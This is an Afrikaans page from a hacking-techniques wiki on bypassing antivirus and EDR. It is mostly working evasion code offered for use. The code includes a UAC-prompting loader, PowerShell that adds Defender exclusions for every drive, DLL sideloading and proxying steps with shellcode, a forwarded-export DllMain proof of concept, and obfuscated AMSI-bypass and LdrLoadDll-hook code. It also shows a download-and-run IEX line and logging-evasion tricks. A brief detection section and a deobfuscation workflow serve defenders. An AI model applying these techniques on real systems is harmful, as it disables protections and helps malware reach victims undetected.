# Antivirus (AV)-omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is aanvanklik geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n Hulpmiddel om te keer dat Windows Defender werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n Hulpmiddel om te keer dat Windows Defender werk deur ’n ander AV na te boots.
- [Deaktiveer Defender as jy admin is](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokmiddel voordat daar met Defender gepeuter word

Openbare loaders wat hulle as game cheats voordoen, word dikwels as ongetekende Node.js/Nexe-installeerders versprei wat eers **die gebruiker vir verhoogde regte vra** en daarna Defender buite werking stel. Die verloop is eenvoudig:

1. Toets vir administrateurkonteks met `net session`. Die opdrag slaag slegs wanneer die gebruiker adminregte het, dus dui ’n mislukking daarop dat die loader as ’n standaardgebruiker loop.
2. Herbegin dit onmiddellik met die `RunAs`-werkwoord om die verwagte UAC-toestemmingsboodskap te aktiveer terwyl die oorspronklike opdragreël behoue bly.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Slagoffers glo reeds dat hulle “cracked”-sagteware installeer, daarom aanvaar hulle gewoonlik die versoek, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.<sup>[[26]](#references)</sup>

### Algemene `MpPreference`-uitsluitings vir elke skyfletter

Sodra dit verhoogde regte het, maksimeer GachiLoader-agtige kettings Defender se blinde kolle eerder as om die diens heeltemal te deaktiveer. Die loader beëindig eers die GUI-waghond (`taskkill /F /IM SecHealthUI.exe`) en voeg dan **uiters breë uitsluitings** by sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Sleutelwaarnemings:

- Die lus deurloop elke gemonteerde lêerstelsel (D:\, E:\, USB-stokkies, ens.), so **enige toekomstige payload wat êrens op die skyf geplaas word, word geïgnoreer**.
- Die uitsluiting van die `.sys`-uitbreiding is vooruitbeplan—aanvallers behou die opsie om later ongetekende drywers te laai sonder om Defender weer aan te raak.
- Alle veranderinge word onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` aangebring, sodat latere fases kan bevestig dat die uitsluitings behoue bly of dit kan uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender-diens gestop word nie, rapporteer naïewe gesondheidstoetse steeds “antivirus active”, al raak intydse inspeksie nooit daardie paaie nie.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Tans gebruik AV’s verskillende metodes om te kontroleer of ’n lêer kwaadwillig is of nie: statiese opsporing, dinamiese ontleding en, vir die meer gevorderde EDR’s, gedragsontleding.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende kwaadwillige stringe of byte-skikkings in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, kontrolesom, ens.). Dit beteken dat bekende publieke tools jou makliker kan laat uitken, aangesien hulle waarskynlik ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV nie jou program kan opspoor nie, maar jy sal ’n soort loader nodig hê om die program te dekripteer en in die geheue uit te voer.

- **Obfuscation**

Soms hoef jy net ’n paar stringe in jou binary of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees, afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer basies in verskeie segmente en laat Defender dan elkeen afsonderlik skandeer. Só kan dit jou presies vertel watter gemerkte stringe of bytes in jou binary voorkom.

Ek beveel sterk aan dat jy na hierdie [YouTube-snitlys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dinamiese ontleding**

Dinamiese ontleding is wanneer AV jou binary in ’n sandbox uitvoer en vir kwaadwillige aktiwiteit dophou (bv. wanneer dit probeer om jou blaaier se wagwoorde te dekripteer en lees, ’n minidump op LSASS uitvoer, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Slaap voor uitvoering** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dinamiese ontleding te omseil. AV’s het baie min tyd om lêers te skandeer sonder om die gebruiker se werkvloei te onderbreek, so lang slaaptye kan die ontleding van binaries belemmer. Die probleem is dat baie AV-sandboxes die slaaptyd eenvoudig kan oorslaan, afhangend van hoe dit geïmplementeer is.
- **Kontroleer die masjien se hulpbronne** Sandboxes het gewoonlik baie min hulpbronne om mee te werk (bv. < 2GB RAM); anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief raak, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed te kontroleer—nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjienspesifieke kontroles** As jy ’n gebruiker wil teiken wie se werkstasie aan die "contoso.local"-domein gekoppel is, kan jy die rekenaar se domein nagaan om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se Sandbox-rekenaarnaam HAL9TH is. Jy kan dus jou malware se rekenaarnaam nagaan voordat dit ontplof. As die naam met HAL9TH ooreenstem, beteken dit dat jy binne Defender se sandbox is, en kan jy jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om sandboxes te ontduik

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie plasing gesê het, sal **publieke tools** uiteindelik **opgespoor word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy werklik mimikatz gebruik**? Of kan jy ’n ander, minder bekende projek gebruik wat ook LSASS dump?

Laasgenoemde is waarskynlik die regte antwoord. As ons mimikatz as voorbeeld neem, is dit waarskynlik een van die mees, indien nie die mees, gemerkte malware deur AV’s en EDR’s. Hoewel die projek self baie gaaf is, is dit ook ’n nagmerrie om daarmee te werk om AV’s te omseil. Soek dus alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir ontduiking verander, maak seker dat jy **outomatiese voorbeeldindiening** in Defender afskakel. En asseblief, ernstig, **MOENIE NA VIRUSTOTAL OPlaai NIE** as jou doel is om op die lang duur ontduiking te bereik. As jy wil kyk of ’n spesifieke AV jou payload opspoor, installeer dit op ’n VM, probeer om outomatiese voorbeeldindiening af te skakel en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, **prioritiseer altyd die gebruik van DLLs vir ontduiking**. Volgens my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en ontleed. Dit is dus ’n baie eenvoudige truuk om in sommige gevalle opsporing te vermy (natuurlik as jou payload op een of ander manier as ’n DLL kan loop).

Soos ons in hierdie beeld kan sien, het ’n DLL-payload van Havoc ’n opsporingsyfer van 4/26 op antiscan.me, terwyl die EXE-payload ’n opsporingsyfer van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-vergelyking van ’n gewone Havoc EXE-payload met ’n gewone Havoc DLL</p></figcaption></figure>

Nou wys ons ’n paar truuks wat jy met DLL-lêers kan gebruik om baie meer onopvallend te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL-soekvolgorde wat die loader gebruik deur die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te plaas.

Jy kan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell-script kyk watter programme vatbaar is vir DLL Sideloading:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Hierdie opdrag sal die lys uitvoer van programme binne "C:\Program Files\\" wat vatbaar is vir DLL hijacking, en die DLL-lêers wat hulle probeer laai.

Ek beveel sterk aan dat jy **self programme verken wat met DLL Hijack/Sideload gebruik kan word**. Hierdie tegniek is redelik stealthy wanneer dit behoorlik toegepas word, maar as jy publiek bekende programme gebruik wat met DLL Sideload gebruik kan word, kan jy maklik gevang word.

Deur bloot ’n kwaadwillige DLL met die naam te plaas wat ’n program verwag om te laai, sal jou payload nie laai nie, aangesien die program spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, gebruik ons ’n ander tegniek genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat ’n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL, en behou sodoende die program se funksionaliteit terwyl dit die uitvoering van jou payload kan hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)-projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Die laaste opdrag sal ons 2 lêers gee: ’n DLL-bronkodesjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het ’n opsporingskoers van 0/26 in [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy na [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, en ook na [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE), om meer te leer oor wat ons in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik “forwarders” is: in plaas daarvan om na kode te verwys, bevat die export-inskrywing ’n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export oplos, sal die Windows loader:

- `TargetDll` laai as dit nog nie gelaai is nie
- `TargetFunc` daaruit oplos

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit vanuit die beskermde KnownDLLs-naamruimte voorsien (bv. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- As `TargetDll` nie ’n KnownDLL is nie, word die gewone DLL-soekvolgorde gebruik, wat die gids insluit van die module wat die forward-resolusie uitvoer.

Dit maak ’n indirekte sideloading-primitief moontlik: vind ’n getekende DLL wat ’n funksie uitvoer wat na ’n module met ’n naam wat nie ’n KnownDLL is nie, forward, en plaas dié getekende DLL saam met ’n aanvaller-beheerde DLL wat presies die naam van die forwarded target-module het. Wanneer die forwarded export opgeroep word, los die loader die forward op en laai jou DLL uit dieselfde gids, wat jou DllMain uitvoer.<sup>[[13]](#references)</sup>

Voorbeeld waargeneem op Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` is nie ’n KnownDLL nie, dus word dit via die normale soekvolgorde opgelos.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na ’n skryfbare vouer
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas ’n kwaadwillige `NCRYPTPROV.dll` in dieselfde vouer. ’n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die aangestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktiveer die forward met ’n signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Waargenome gedrag:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers ’n "missing API"-fout nadat `DllMain` reeds uitgevoer is

Wenke vir opsporing:
- Fokus op forwarded exports waarvan die teikenmodule nie ’n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports met nutsgoed soos die volgende opspoor:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11-aanstuurder-inventaris om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Idees vir opsporing/verdediging:
- Monitor LOLBins (bv. rundll32.exe) wat ondertekende DLL’s vanaf nie-stelselroetes laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Stel ’n waarskuwing in vir proses-/modulekettings soos: `rundll32.exe` → nie-stelsel-`keyiso.dll` → `NCRYPTPROV.dll` onder skryfbare gebruikersroetes
- Dwing kode-integriteitsbeleide (WDAC/AppLocker) af en weier skryf- en uitvoertoegang in toepassinggidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op ’n sluipende manier te laai en uit te voer.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is bloot 'n kat-en-muis-speletjie. Wat vandag werk, kan môre opgespoor word, so moet nooit op net een hulpmiddel staatmaak nie; probeer, indien moontlik, verskeie evasion-tegnieke kombineer.

## Direct/Indirect Syscalls & SSN-resolusie (SysWhispers4)

EDR's plaas dikwels **user-mode inline hooks** op `ntdll.dll`-syscall-stubs. Om hierdie hooks te omseil, kan jy **direct** of **indirect** syscall-stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorskakel sonder om die hooked export-entrypoint uit te voer.<sup>[[32]](#references)</sup>

**Aanroepopsies:**
- **Direct (embedded)**: voeg 'n `syscall`/`sysenter`/`SVC #0`-instruksie by die gegenereerde stub (geen `ntdll`-export word aangeroep nie).
- **Indirect**: spring na 'n bestaande `syscall`-gadget binne `ntdll` sodat dit lyk asof die kerneloorgang van `ntdll` afkomstig is (nuttig vir heuristiese evasion); **randomized indirect** kies per aanroep 'n gadget uit 'n poel.
- **Egg-hunt**: vermy die inbedding van die statiese `0F 05`-opkodereeks op skyf; los 'n syscall-reeks tydens looptyd op.

**Hook-bestande SSN-resolusiestrategieë:**
- **FreshyCalls (VA sort)**: lei SSN's af deur syscall-stubs volgens virtuele adres te sorteer eerder as om stub-grepe te lees.
- **SyscallsFromDisk**: karteer 'n skoon `\KnownDlls\ntdll.dll`, lees SSN's uit sy `.text` en ontkarteer dit dan (omseil alle hooks in geheue).
- **RecycledGate**: kombineer VA-gesorteerde SSN-afleiding met opkode-validering wanneer 'n stub skoon is; val terug op VA-afleiding as dit hooked is.
- **HW Breakpoint**: stel DR0 op die `syscall`-instruksie en gebruik 'n VEH om die SSN tydens looptyd uit `EAX` vas te lê, sonder om hooked grepe te ontleed.

Voorbeeld van SysWhispers4-gebruik:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[lêerlose wanware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, so as jy op een of ander manier loonvragte **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is by hierdie Windows-komponente geïntegreer.

- User Account Control, of UAC (verhoging van EXE, COM, MSI of ActiveX-installasie)
- PowerShell (skripte, interaktiewe gebruik en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA-makro's

Dit stel antivirusoplossings in staat om skripgedrag te inspekteer deur skripinhoud in 'n vorm bloot te stel wat ongeënkripteer en nie-verdoesel is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` byvoeg, gevolg deur die pad na die uitvoerbare lêer waarvandaan die skrip uitgevoer is; in hierdie geval, powershell.exe.

Ons het geen lêer op skyf geplaas nie, maar is steeds in die geheue opgespoor weens AMSI.

Verder word C#-kode, vanaf **.NET 4.8**, ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` om uitvoering in die geheue te laai. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) vir uitvoering in die geheue te gebruik as jy AMSI wil ontduik.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese opsporing werk, kan die wysiging van die skripte wat jy probeer laai 'n goeie manier wees om opsporing te ontduik.

AMSI kan egter skripte de-verdoesel, selfs al het hulle verskeie lae, so verdoeseling kan 'n swak keuse wees, afhangend van hoe dit gedoen word. Dit maak ontduiking nie juis eenvoudig nie. Soms hoef jy egter net 'n paar veranderlike name te verander en dan is alles reg; dit hang dus af van hoeveel van iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit maklik om daarmee te peuter, selfs wanneer jy as 'n gebruiker sonder verhoogde regte loop. Weens hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

As jy AMSI-inisialisering dwing om te misluk (amsiInitFailed), sal geen skandering vir die huidige proses begin word nie. Dit is oorspronklik deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak, en Microsoft het 'n handtekening ontwikkel om wydverspreide gebruik te voorkom.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Al wat nodig was, was een reël PowerShell-kode om AMSI onbruikbaar te maak vir die huidige PowerShell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, so ’n wysiging is nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI-bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Hou in gedagte dat dit waarskynlik gevlag sal word sodra hierdie plasing verskyn, dus moet jy nie enige kode publiseer as jou plan is om ongemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik deur [@RastaMouse](https://twitter.com/_RastaMouse/) ontdek. Dit behels dat die adres van die "AmsiScanBuffer"-funksie in amsi.dll (wat verantwoordelik is vir die skandering van die gebruiker-verskafte invoer) opgespoor en met instruksies oorskryf word om die kode vir E_INVALIDARG terug te gee. Op hierdie manier gee die resultaat van die werklike skandering 0 terug, wat as ’n skoon resultaat geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir ’n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke om AMSI met powershell te omseil. Kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. ’n Robuuste, taal-onafhanklike omseiling is om ’n user-mode hook op `ntdll!LdrLoadDll` te plaas wat ’n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik word AMSI nooit gelaai nie en vind geen skanderings vir daardie proses plaas nie.<sup>[[23]](#references)</sup>

Implementeringsoorsig (x64 C/C++-pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Werk met PowerShell, WScript/CScript en pasgemaakte loaders (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die toevoer van scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is al gebruik deur loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

Die tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook script om AMSI te omseil.
Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook script om AMSI te omseil wat signatures vermy deur ’n ewekansige gebruikergedefinieerde funksie, veranderlikes en karakteruitdrukkings te gebruik, en ewekansige hooflettergebruik vir PowerShell-sleutelwoorde toe te pas om signatures te vermy.

**Verwyder die bespeurde signature**

Jy kan ’n tool soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die bespeurde AMSI-signature uit die geheue van die huidige proses te verwyder. Hierdie tool werk deur die geheue van die huidige proses vir die AMSI-signature te deursoek en dit dan met NOP-instruksies te oorskryf, sodat dit effektief uit die geheue verwyder word.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik Powershell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging is ’n funksie waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan aanteken. Dit kan nuttig wees vir ouditering en probleemoplossing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell weergawe 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou scripts kan uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n onbestuurde PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit ontduik kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanself AMSI, Script Block Logging of elke ander PowerShell-verdediging nie; dekking hang af van die runtime en gasheerimplementering.


## Obfuskasie

> [!TIP]
> Verskeie obfuskasietegnieke berus op die enkriptering van data, wat die entropie van die binary verhoog en dit makliker maak vir AV’s en EDR’s om op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke gedeeltes van jou kode wat sensitief is of versteek moet word.

### Deobfuskering van ConfuserEx-beskermde .NET-binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat dekompileerders en sandboxes sal blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL** wat daarna met nutsmiddels soos dnSpy of ILSpy na C# gedekompileer kan word.<sup>[[10]](#references)</sup>

1.  Verwydering van anti-peuterbeskerming – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die statiese konstruktor van die *module* (`<Module>.cctor`). Dit wysig ook die PE-kontrolesom sodat enige wysiging die binary sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadatatabelle op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool- / control-flow-herwinning – voer die *skoon* lêer aan **de4dot-cex** ('n ConfuserEx-bewuste fork van de4dot) toe.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlae:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en veranderlike name herstel, en konstante strings dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte metode-oproepe met liggewig-omhulsels (ook bekend as *proxy calls*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

